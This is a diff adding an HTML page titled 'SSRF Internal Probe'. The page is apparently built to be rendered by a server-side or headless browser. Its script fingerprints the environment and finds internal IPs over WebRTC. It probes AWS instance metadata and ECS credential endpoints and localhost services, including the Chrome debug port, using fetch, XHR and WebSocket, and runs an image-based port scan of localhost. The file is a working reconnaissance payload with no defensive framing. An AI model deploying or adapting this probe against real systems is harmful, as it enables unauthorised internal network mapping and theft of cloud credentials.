@@ -1,0 +1,111 @@
+<html><body>
+<h2>SSRF Internal Probe</h2>
+<pre id="r"></pre>
+<script>
+const R=document.getElementById('r');
+function L(s){R.textContent+=s+'\n';}
+
+// 1. Environment
+L('== ENV ==');
+L('UA: '+navigator.userAgent);
+L('Platform: '+navigator.platform);
+L('Cores: '+navigator.hardwareConcurrency);
+L('Webdriver: '+navigator.webdriver);
+L('Memory: '+(navigator.deviceMemory||'?')+'GB');
+L('Lang: '+navigator.language);
+L('Location: '+location.href);
+
+// 2. WebRTC internal IP discovery
+L('\n== WebRTC IPs ==');
+try{
+  var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+  pc.createDataChannel('');
+  pc.onicecandidate=function(e){
+    if(!e.candidate){L('ICE done');return;}
+    var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+    if(m)L('IP: '+m[0]);
+    L('raw: '+e.candidate.candidate);
+  };
+  pc.createOffer().then(function(o){pc.setLocalDescription(o);});
+}catch(e){L('WebRTC err: '+e.message);}
+
+// 3. Fetch probes with timing
+async function probe(url,label){
+  var t=Date.now();
+  try{
+    var r=await fetch(url,{mode:'no-cors'});
+    L(label+': type='+r.type+' t='+(Date.now()-t)+'ms');
+  }catch(e){
+    L(label+': ERR='+e.message+' t='+(Date.now()-t)+'ms');
+  }
+}
+
+// 4. XHR probe (might behave differently)
+function xhr(url,label){
+  return new Promise(function(ok){
+    var t=Date.now();
+    var x=new XMLHttpRequest();
+    x.open('GET',url);
+    x.timeout=4000;
+    x.onload=function(){L(label+' XHR: s='+x.status+' len='+x.responseText.length+' t='+(Date.now()-t)+'ms');ok();};
+    x.onerror=function(){L(label+' XHR: ERR t='+(Date.now()-t)+'ms');ok();};
+    x.ontimeout=function(){L(label+' XHR: TIMEOUT t='+(Date.now()-t)+'ms');ok();};
+    try{x.send();}catch(e){L(label+' XHR: CATCH='+e.message);ok();}
+  });
+}
+
+// 5. WebSocket probe
+function wsProbe(url,label){
+  return new Promise(function(ok){
+    var t=Date.now();
+    try{
+      var ws=new WebSocket(url);
+      ws.onopen=function(){L(label+' WS: OPEN t='+(Date.now()-t)+'ms');ws.close();ok();};
+      ws.onerror=function(){L(label+' WS: ERR t='+(Date.now()-t)+'ms');ok();};
+      ws.onmessage=function(e){L(label+' WS: MSG='+e.data.substring(0,200)+' t='+(Date.now()-t)+'ms');};
+      setTimeout(function(){ok();},4000);
+    }catch(e){L(label+' WS: CATCH='+e.message);ok();}
+  });
+}
+
+// 6. Image-based port scan
+function imgScan(host,port){
+  return new Promise(function(ok){
+    var t=Date.now();
+    var img=new Image();
+    img.onload=function(){L(host+':'+port+' img=LOAD '+(Date.now()-t)+'ms');ok();};
+    img.onerror=function(){L(host+':'+port+' img=ERR '+(Date.now()-t)+'ms');ok();};
+    img.src='http://'+host+':'+port+'/';
+    setTimeout(function(){L(host+':'+port+' img=TIMEOUT '+(Date.now()-t)+'ms');ok();},3000);
+  });
+}
+
+(async function(){
+  L('\n== Fetch Probes ==');
+  await probe('http://169.254.169.254/latest/meta-data/','IMDS');
+  await probe('http://169.254.169.254/latest/dynamic/instance-identity/document','IMDS-id');
+  await probe('http://169.254.170.2/v2/metadata','ECS');
+  await probe('http://169.254.170.2/v2/credentials','ECS-cred');
+  await probe('http://127.0.0.1/','lo80');
+  await probe('http://127.0.0.1:8080/','lo8080');
+  await probe('http://127.0.0.1:9222/json','lo9222');
+
+  L('\n== XHR Probes ==');
+  await xhr('http://169.254.169.254/latest/meta-data/','IMDS');
+  await xhr('http://169.254.169.254/latest/dynamic/instance-identity/document','IMDS-id');
+
+  L('\n== WebSocket Probes ==');
+  await wsProbe('ws://169.254.169.254:80/','IMDS');
+  await wsProbe('ws://127.0.0.1:9222/','lo-debug');
+  await wsProbe('ws://127.0.0.1:80/','lo80');
+
+  L('\n== Port Scan ==');
+  var ports=[22,80,443,3000,4443,5000,5432,6379,8080,8443,9090,9200,9222,27017];
+  for(var i=0;i<ports.length;i++){
+    await imgScan('127.0.0.1',ports[i]);
+  }
+
+  L('\n== DONE ==');
+})();
+</script>
+</body></html>
